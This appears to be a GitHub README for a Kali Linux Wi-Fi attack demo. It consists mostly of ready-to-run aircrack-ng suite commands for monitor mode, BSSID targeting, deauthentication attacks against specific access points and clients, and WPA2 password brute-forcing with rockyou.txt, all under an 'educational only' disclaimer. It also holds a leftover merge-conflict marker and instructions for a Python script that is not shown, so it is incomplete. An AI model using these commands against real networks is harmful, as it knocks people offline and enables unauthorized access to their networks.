# WiFi-DOS-Kali

Demo of Wi-Fi DoS attacks via Kali Linux using tools like Aircrack-ng and Aireplay-ng.  
This project demonstrates deauthentication attacks, brute-force cracking, and defenses.  
It also includes a presentation on attack types, tools, and commands.  

**⚠️ For ethical research and educational purposes only.**

---

## Table of Contents

1. [Demonstration](#demonstration)
2. [Instructions](#instructions)
3. [Prerequisites](#prerequisites)

---

## Demonstration

### View Network Interfaces
```bash
ifconfig
```

### Start Monitor Mode on `wlan0`
```bash
airmon-ng start wlan0
```

### Kill Interfering Processes
```bash
airmon-ng check kill
```

### Confirm Monitor Mode
```bash
iwconfig
```

### Start Scanning for Wi-Fi Networks
```bash
airodump-ng -i wlan1
```

### Target Specific BSSID and Channel
```bash
airodump-ng --bssid 8E:F5:A3:77:D6:DB -c 3 -- wlan0
airodump-ng --bssid A8:32:9A:00:CE:96 -c 11 -w /root/Desktop/wpa2 -- wlan1
```

### Deauthentication Attack (Kick Clients Out)
```bash
aireplay-ng -0 20 -a A8:32:9A:00:CE:96 -c 08:4A:CF:7D:47:14 wlan1
aireplay-ng -0 20 -a F8:0C:58:B7:4C:51 wlan1
```

### Brute Force Attack
```bash
aircrack-ng -a2 -b F8:0C:58:B7:4C:51 -w /home/kali/Desktop/rockyou.txt /home/kali/Desktop/wpa2/-01.cap
```

### Stop Monitor Mode
```bash
airmon-ng stop wlan1

sudo service network-manager restart

sudo systemctl restart NetworkManager

```

---

=======

**#  📝 Instructions** # WiFi-DOS-Kali

1. Save the script as `wifi_dos_attack.py`.
2. Run it with `sudo`:
   ```bash
   sudo python3 wifi_dos_attack.py
   ```
3. Ensure the Aircrack-ng suite is installed:
   ```bash
   sudo apt install aircrack-ng
   ```

---

## Prerequisites

- **Operating System**: Kali Linux
- **Tools**: Aircrack-ng suite (includes `airodump-ng`, `aireplay-ng`, etc.)
- **Hardware**: A Wi-Fi adapter capable of monitor mode and packet injection
- **Permissions**: Root access (`sudo`)

---

**Disclaimer**:  
This project is intended for ethical research and educational purposes only.  
Unauthorized use of these tools may violate laws and regulations.